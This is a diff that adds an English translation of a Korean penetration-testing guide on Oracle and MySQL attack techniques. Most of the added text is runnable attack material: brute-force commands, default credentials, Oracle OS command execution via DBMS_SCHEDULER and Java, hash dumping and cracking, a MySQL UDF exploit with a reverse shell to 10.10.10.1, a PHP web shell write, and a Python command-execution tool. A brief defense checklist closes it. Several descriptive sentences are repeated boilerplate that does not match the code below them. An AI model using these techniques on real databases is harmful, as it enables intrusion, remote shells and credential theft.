@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Oracle / MySQL 공격 기법
 
 ## 1. DB 해킹 개요
@@ -328,4 +334,334 @@ MySQL:
   □ DB 계정 최소권한 원칙 적용
   □ 쿼리 로깅 활성화 및 이상 탐지
   □ 패스워드 복잡도 정책 강제
+```
+
+---
+
+<a name="english"></a>
+
+# Oracle / MySQL Attack Techniques
+
+## 1. Database Hacking Overview
+
+```
+Attack Entry Points:
+  Web Application → SQLi → DB Shell
+  Network Scan    → Direct access to exposed DB ports
+  Credential Cracking → Default accounts / weak passwords
+
+Default Ports:
+  Oracle    → 1521 (TNS Listener)
+  MySQL     → 3306
+  MSSQL     → 1433
+  PostgreSQL → 5432
+```
+
+---
+
+## 2. Oracle Attacks
+
+### 2-1. TNS Listener Scanning and SID Enumeration
+
+```bash
+# Detect Oracle with nmap
+nmap -sV -p 1521 --script oracle-tns-version <target>
+
+# Enumerate SIDs with tnscmd10g
+tnscmd10g status -h <target>
+tnscmd10g version -h <target>
+
+# Auto-brute-force SIDs with oscanner
+oscanner -s <target> -P 1521
+
+# Metasploit SID enumeration
+msfconsole -q -x "use auxiliary/scanner/oracle/sid_enum; \
+  set RHOSTS <target>; run"
+```
+
+### 2-2. Oracle Default Account Brute Force
+
+Commands to check Oracle database vulnerabilities. Verify TNS listener configuration and default account usage.
+
+```bash
+# Metasploit Oracle login brute force
+use auxiliary/scanner/oracle/oracle_login
+set RHOSTS <target>
+set SID ORCL
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
+run
+
+# Brute force Oracle with hydra
+hydra -L users.txt -P pass.txt <target> oracle-listener -s 1521 -S ORCL
+```
+
+```
+Key Oracle Default Accounts:
+  sys       / change_on_install
+  system    / manager
+  scott     / tiger
+  dbsnmp    / dbsnmp
+  sysman    / sysman
+  outln     / outln
+```
+
+### 2-3. Oracle SQLi → OS Command Execution
+
+SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.
+
+```sql
+-- Read files with UTL_FILE
+SELECT UTL_FILE.GET_LINE(
+  UTL_FILE.FOPEN('/etc', 'passwd', 'R'), 1
+) FROM DUAL;
+
+-- Execute OS commands with DBMS_SCHEDULER (requires DBA privileges)
+BEGIN
+  DBMS_SCHEDULER.CREATE_JOB(
+    job_name   => 'PWNJOB',
+    job_type   => 'EXECUTABLE',
+    job_action => '/bin/bash',
+    number_of_arguments => 2
+  );
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNJOB', 1, '-c');
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNJOB', 2, 'id > /tmp/out.txt');
+  DBMS_SCHEDULER.ENABLE('PWNJOB');
+END;
+/
+
+-- Execute OS commands with Java (Java-enabled Oracle)
+SELECT DBMS_JAVA.RUNJAVA(
+  'oracle/aurora/util/Wrapper /bin/bash -c "id > /tmp/pwn.txt"'
+) FROM DUAL;
+
+-- Code execution via external procedures (using extproc)
+-- Load extproc from TNS listener then call shared library
+```
+
+### 2-4. Oracle Password Hash Extraction and Cracking
+
+SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.
+
+```sql
+-- Oracle 11g and below — DES-based hash
+SELECT username, password FROM sys.user$ WHERE type# = 1;
+
+-- Oracle 12c and above — SHA-512 based
+SELECT name, spare4 FROM sys.user$ WHERE type# = 1;
+```
+
+Commands to check Oracle database vulnerabilities. Verify TNS listener configuration and default account usage.
+
+```bash
+# Crack Oracle 11g hashes with Hashcat
+# Format: username:hash
+hashcat -m 3100 oracle_hashes.txt rockyou.txt
+
+# Oracle 12c (SHA-512 with salt)
+hashcat -m 12300 oracle12_hashes.txt rockyou.txt
+```
+
+### 2-5. Oracle TNS Poison Attack
+
+```
+Attack Principle:
+  Normal: Client → TNS Listener (1521) → DB Server
+  Attack: Client → [Attacker MitM] → DB Server
+
+  Exploits TNS Listener accepting redirect commands from external sources
+  → Redirects client connections to attacker's server
+  → Credential interception
+
+Tool: tnspoisoning (Metasploit: auxiliary/admin/oracle/tnscmd)
+
+Patch: External redirect blocked after Oracle CPU 2012-01
+       Oracle 11.2.0.3+ blocks by default
+```
+
+---
+
+## 3. MySQL Attacks
+
+### 3-1. MySQL Information Gathering
+
+Connect via MySQL client and gather basic information. Check `show databases`, `show grants`, `@@global.secure_file_priv`, etc. to assess file read/write privileges and data dump possibilities.
+
+```bash
+# nmap MySQL scan
+nmap -sV -p 3306 --script mysql-info,mysql-databases,mysql-users <target>
+
+# MySQL brute force
+hydra -L users.txt -P pass.txt <target> mysql
+nmap -p 3306 --script mysql-brute <target>
+```
+
+### 3-2. OS Command Execution via MySQL UDF (User Defined Function)
+
+SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.
+
+```sql
+-- Step 1: Upload UDF shared library
+-- Upload lib_mysqludf_sys.so to the plugin directory
+SELECT @@plugin_dir;
+-- /usr/lib/mysql/plugin/
+
+-- Drop binary with INTO DUMPFILE
+SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+
+-- Step 2: Register UDF functions
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
+CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
+
+-- Step 3: Execute commands
+SELECT sys_eval('id');
+SELECT sys_eval('cat /etc/passwd');
+SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
+```
+
+```python
+import pymysql
+import argparse
+import base64
+from pathlib import Path
+
+def mysql_udf_exec(host: str, user: str, password: str, cmd: str) -> str:
+    conn = pymysql.connect(host=host, user=user, password=password, db='mysql')
+    cur = conn.cursor()
+
+    cur.execute("SELECT @@plugin_dir")
+    plugin_dir = cur.fetchone()[0]
+    print(f"[*] Plugin dir: {plugin_dir}")
+
+    cur.execute("SELECT sys_eval(%s)", (cmd,))
+    result = cur.fetchone()
+    cur.close()
+    conn.close()
+    return result[0] if result else ""
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="MySQL UDF command execution")
+    parser.add_argument("host")
+    parser.add_argument("user")
+    parser.add_argument("password")
+    parser.add_argument("cmd")
+    args = parser.parse_args()
+
+    out = mysql_udf_exec(args.host, args.user, args.password, args.cmd)
+    print(f"[+] Result:\n{out}")
+
+if __name__ == "__main__":
+    main()
+```
+
+### 3-3. MySQL File Read/Write
+
+SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.
+
+```sql
+-- Read files (requires FILE privilege)
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/var/www/html/config.php');
+
+-- Write web shell
+SELECT '<?php system($_GET["cmd"]); ?>'
+INTO OUTFILE '/var/www/html/shell.php';
+
+-- Check secure_file_priv bypass
+SHOW VARIABLES LIKE 'secure_file_priv';
+-- Empty value means all paths are allowed
+```
+
+### 3-4. MySQL Hash Extraction and Cracking
+
+SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.
+
+```sql
+-- MySQL 5.x and below
+SELECT user, password FROM mysql.user;
+
+-- MySQL 8.x (SHA-256 based)
+SELECT user, authentication_string FROM mysql.user;
+```
+
+Check MySQL/MariaDB security configuration. Verify remote root access, empty password accounts, and unnecessary privileges.
+
+```bash
+# MySQL 4.x/5.x (MySQL323 / MySQL41 hashes)
+hashcat -m 200  mysql_hashes.txt rockyou.txt   # MySQL323
+hashcat -m 300  mysql_hashes.txt rockyou.txt   # MySQL41 (SHA1*SHA1)
+
+# MySQL 8.x (caching_sha2_password)
+hashcat -m 7401 mysql_hashes.txt rockyou.txt
+```
+
+---
+
+## 4. Common DB Automated Scanner
+
+```python
+import socket
+import argparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+DB_PORTS = {
+    1521: "Oracle",
+    3306: "MySQL",
+    1433: "MSSQL",
+    5432: "PostgreSQL",
+    27017: "MongoDB",
+    6379: "Redis",
+    5984: "CouchDB",
+}
+
+def check_port(ip: str, port: int, timeout: float = 1.5) -> tuple[int, bool]:
+    try:
+        with socket.create_connection((ip, port), timeout=timeout):
+            return port, True
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        return port, False
+
+def scan_db_ports(target: str) -> None:
+    print(f"[*] DB port scan: {target}")
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        futures = {ex.submit(check_port, target, p): p for p in DB_PORTS}
+        for f in as_completed(futures):
+            port, open_ = f.result()
+            if open_:
+                db = DB_PORTS[port]
+                print(f"  [OPEN] {port}/tcp — {db}")
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="DB port scanner")
+    parser.add_argument("target", help="IP or hostname")
+    args = parser.parse_args()
+    scan_db_ports(args.target)
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. Defense Checklist
+
+```
+Oracle:
+  □ Disable default accounts (scott, dbsnmp, outln)
+  □ Block external TNS redirect (VALID_NODE_CHECKING=YES)
+  □ Disable extproc if not in use
+  □ REVOKE UTL_FILE, UTL_TCP, UTL_HTTP if unnecessary
+  □ Apply latest CPU (Critical Patch Update)
+
+MySQL:
+  □ Block remote root access (bind-address = 127.0.0.1)
+  □ Minimize FILE, SUPER privileges
+  □ Configure secure_file_priv (allow only specific paths)
+  □ Harden UDF plugin directory permissions
+  □ Remove unnecessary users and empty-password accounts
+
+Common:
+  □ Restrict DB ports with firewall (allow only app server IPs)
+  □ Apply principle of least privilege for DB accounts
+  □ Enable query logging and anomaly detection
+  □ Enforce password complexity policies
 ```
